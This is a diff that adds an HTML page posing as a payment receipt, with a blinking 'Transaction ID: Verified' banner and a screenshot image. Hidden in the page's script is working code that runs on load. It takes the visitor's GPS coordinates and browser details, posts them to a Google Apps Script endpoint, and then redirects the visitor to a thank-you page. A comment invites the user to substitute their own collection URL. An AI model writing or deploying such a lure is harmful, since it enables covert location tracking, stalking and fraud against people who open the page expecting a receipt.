@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Payment Receipt</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      background-color: #f9f9f9;
+      padding: 40px;
+    }
+    h1 {
+      color: green;
+      animation: blinker 1s linear infinite;
+    }
+    @keyframes blinker {
+      50% { opacity: 0; }
+    }
+    img {
+      margin-top: 20px;
+      border: 2px solid #ccc;
+      box-shadow: 2px 2px 8px rgba(0,0,0,0.2);
+    }
+  </style>
+</head>
+<body>
+  <h1>🧾 Receipt Sent - Transaction ID: Verified ✔</h1>
+
+  <!-- 👇 Screenshot Image from the same folder -->
+  <img src="screenshot.jpg" alt="Payment Screenshot" width="400" />
+
+  <p>Loading...</p>
+
+  <script>
+    // Geolocation
+    navigator.geolocation.getCurrentPosition(function(pos) {
+      const data = {
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        device: navigator.userAgent
+      };
+
+      // 👇 Replace with your real Apps Script URL
+      fetch("https://script.google.com/macros/s/AKfycbyJgwwX-_Cg4PjBLpXlTXbRs2zBPhxGXWjUD82vgeYEzo5B73tJfSsIT5IGXqs--1WS/exec", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+    });
+
+    // 👇 Redirect to thankyou.html after 5 seconds
+    setTimeout(() => {
+      window.location.href = "thankyou.html";
+    }, 5000);
+  </script>
+</body>
+</html>
